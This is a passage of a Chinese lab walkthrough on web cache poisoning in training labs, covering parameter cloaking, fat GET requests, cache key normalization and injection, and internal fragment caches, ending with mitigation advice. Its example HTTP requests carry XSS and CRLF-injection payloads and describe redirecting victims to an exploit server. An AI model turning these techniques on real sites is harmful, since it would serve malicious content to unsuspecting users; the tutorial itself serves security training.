<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%8F%82%E6%95%B0%E5%B7%AE%E5%BC%82"></a>**配套靶场：参数差异**

这一关主要是考察缓存与后台对URL参数的处理方式不同导致的Web缓存投毒，通过扫描得知utm_content是可伪装的缓存键，后台将(&amp;)和(;)识别为分界符，这样就可以利用这种差异覆盖回调参数的值为我们指定的函数

[![](https://p5.ssl.qhimg.com/t011b083adbba353969.png)](https://p5.ssl.qhimg.com/t011b083adbba353969.png)

这样访问首页的人就也会接收到我们的投毒缓存了

[![](https://p1.ssl.qhimg.com/t012c39bb6e25fb05d5.png)](https://p1.ssl.qhimg.com/t012c39bb6e25fb05d5.png)

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%94%AF%E6%8C%81fat%20GET%E8%AF%B7%E6%B1%82"></a>利用支持fat GET请求**

有的时候请求方法并不是缓存键，这时候如果支持fat GET请求方法就也可以用来进行Web缓存投毒。fat GET请求很特殊，拥有URL查询参数和正文参数，而只有请求行是缓存键，而且应用程序会从正文参数获取参数值，例如我们构造这样的请求

```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

如果X-HTTP-Method-Override头也是非缓存键，我们可以构造伪POST请求来攻击，例如

```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87fat%20GET%E8%AF%B7%E6%B1%82%E7%9A%84Web%E7%BC%93%E5%AD%98%E5%93%8D%E5%BA%94"></a>配套靶场：通过fat GET请求的Web缓存响应**

这一关考察的是HTTP方法不是缓存键，这样我们就可以把覆盖的值插入到正文参数中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c0f47be52a057c51.png)

这样的话在缓存看来直接访问首页的人会被识别成等效页面而接收到缓存副本，在后台看来会识别成POST方法而读取覆盖之后的callback参数的值而返回投毒响应，这样访问首页的人就会接收到投毒缓存了

[![](https://p1.ssl.qhimg.com/t016e9b7d70cabc66a9.png)](https://p1.ssl.qhimg.com/t016e9b7d70cabc66a9.png)

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%B5%84%E6%BA%90%E5%AF%BC%E5%85%A5%E7%9A%84%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9"></a>利用资源导入的动态内容**

有的时候虽然看上去是导入静态文件，但是也可以向查询字符串中注入恶意payload构造某些攻击，例如

```
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…

```

甚至可以注入XSS payload

```
GET /style.css?excluded_param=alert(1)%0A`{``}`*`{`color:red;`}` HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1)`{``}`*`{`color:red;`}`

```

**<a class="reference-link" name="%E6%A0%87%E5%87%86%E5%8C%96%E7%9A%84%E7%BC%93%E5%AD%98%E9%94%AE"></a>标准化的缓存键**

有的时候对缓存键的规范化也会触发Web缓存投毒，比如缓存服务器会统一做URL解码，所以下面两条被认为是等效的

```
GET /example?param="&gt;&lt;test&gt;
GET /example?param=%22%3e%3ctest%3e

```

这就导致原本无法成功利用的XSS攻击可以重新成功利用

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9AURL%E6%A0%87%E5%87%86%E5%8C%96"></a>配套靶场：URL标准化**

这一关考察的是利用缓存与后台对编码的处理方式不同，浏览器会做URL编码，但是到后台不会解码导致无法XSS攻击，但是缓存会对编码做标准化，这样我们访问一个不存在的路径，这样响应就是经过缓存标准化的结果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01192879ca9a6c091a.png)

这样我们在Web缓存还在生效的时候给受害者投放带payload的URL就能重新成功攻击

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01222591e0cfda4294.png)

**<a class="reference-link" name="%E7%BC%93%E5%AD%98%E9%94%AE%E6%B3%A8%E5%85%A5"></a>缓存键注入**

我们还可以利用双下划线(__)分隔不同的字段的方式让两个不同的请求识别为等效的，例如

```
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

&lt;script&gt;…'-alert(1)-'…&lt;/script&gt;

```

它和下面的一对请求和响应是等效的

```
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

&lt;script&gt;…'-alert(1)-'…&lt;/script&gt;

```

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E7%BC%93%E5%AD%98%E9%94%AE%E6%B3%A8%E5%85%A5"></a>配套靶场：缓存键注入**

我们需要构造一条Web缓存投毒链，因为是一层一层跳转的，所以我们要从里到外的顺序构造Web缓存投毒，因为访问首页会自动跳转到/login，所以我们需要先在/js/localize.js然后在/login构造

[![](https://p2.ssl.qhimg.com/t01fcebc7c26f124524.png)](https://p2.ssl.qhimg.com/t01fcebc7c26f124524.png)

这里涉及到多个知识点，第一个就是CRLF注入，就是CR是回车符，LF是换行符，CRLF组合在一起就是相当于另起一行，这样我们就可以在一个HTTP头部字段里面注入多个字段，从图中的框框来看，确实实现了这种效果，而CRLFCRLF即表示头部的结束，主体的开始，我们就可以把xss语句插入到里面实现XSS攻击，为了能将请求的内容注入到响应中，我们需要开启cors，即将cors=0改为cors=1，并将payload写入Origin字段实施注入，然后我们需要产生Web缓存那就需要引入utm_content字段，经过测试，utm_content和Origin的值是可以任意字符串的，但是URL里面的x就只能是x=1，这个x=1是开启缓存功能的开关，然后构造/login页面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0101c169b0b353332e.png)

因为我们已经利用/js/localize.js构造Web缓存，然后在/login的URL里面直接构造这样的payload会被缓存识别为等效页面而投放中毒缓存

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016325f8afb9ba3a51.png)

**<a class="reference-link" name="%E5%AF%B9%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>对内部缓存投毒**

前面讲的都是从外部构造各种稀奇古怪的攻击方式。有的应用程序不会缓存整个响应，而是使用缓存片段，这让Web缓存投毒的攻击面达到最大，因为可能所有用户都可能接收到拼接了被投毒的缓存片段的响应。在这种攻击方式中，缓存键的概念已不使用，我们甚至只需要简单地修改Host头即可

<a class="reference-link" name="%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%AF%B9%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>**如何识别对内部缓存投毒**

如果我们一系列的输入中最开始的输入和最后的输入出现在了同一个响应中则说明当前应用程序采用缓存片段技术。

<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%AF%B9%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>**配套靶场：对内部缓存投毒**

这一关讲的是对内部缓存投毒，就是将一整个缓存换成多个可重用的片段，有的时候你的一个请求产生的缓存会流向其他页面，然后我们将param miner中的add dynamic cache-buster打开，然后在X-Forwarded-Host字段写入Exploit Server的地址以重定向到我们的投毒页面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0104a18aed142e0701.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0100fb8868eddbb995.png)

多重放几次，直到最后一个URL被替换为Exploit Server的地址

[![](https://p3.ssl.qhimg.com/t01b41f669779bcc465.png)](https://p3.ssl.qhimg.com/t01b41f669779bcc465.png)

<a class="reference-link" name="%E5%AE%89%E5%85%A8%E5%9C%B0%E6%B5%8B%E8%AF%95%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98"></a>**安全地测试内部缓存**

因为测试内部缓存可能会导致所有用户都收到恶意的缓存片段，所以在发送每一条测试请求之前都要考虑后果。尽量不要使用类似带外等技术发送跨域请求。



## 如果缓解Web缓存投毒漏洞？

Web缓存投毒漏洞非常隐蔽，决定开启缓存功能的应用程序一定要进行严格的安全防护，尽量使用静态响应及对导入的资源进行校验。尽可能修复客户端漏洞以防止被进一步利用。应禁止模棱两可的请求方法，如fat Get方法。应尽可能禁用不需要的一切HTTP头字段，无论多罕见。



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之高级漏洞篇 – Web缓存投毒专题的全部内容啦，本专题主要讲了Web缓存投毒的形成原理，以及从缓存设计与实现缺陷两个大角度介绍了各种可能的漏洞利用方式，最后简单介绍了防护手段，该专题的东西很多很复杂，需要大家耐心花点时间消化哦，感兴趣的同学可以在评论区进行讨论，嘻嘻嘻。
